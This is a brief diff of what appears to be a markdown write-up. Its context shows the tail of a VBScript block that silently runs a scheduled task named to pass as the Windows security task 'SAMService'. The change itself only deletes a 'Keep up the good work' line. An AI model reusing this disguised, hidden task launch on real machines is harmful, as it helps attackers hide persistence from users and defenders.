@@ -58,8 +58,6 @@ Wscript.Sleep(2000)
 o.run "schtasks /run /tn " & chr(34) & "Microsoft\Windows\Security\SAMService" & chr(34),0,0
 ```
 
-Keep up the good work 
-
 ![resim](https://user-images.githubusercontent.com/103955692/163860298-2adb53c3-f030-43ad-8b0b-66f84201a688.png)
 ![resim](https://user-images.githubusercontent.com/103955692/163860309-780b3942-cd64-4cec-bb43-931416d5993b.png)
 ![resim](https://user-images.githubusercontent.com/103955692/163860330-fb515385-55ec-4846-9e17-71684636f900.png)
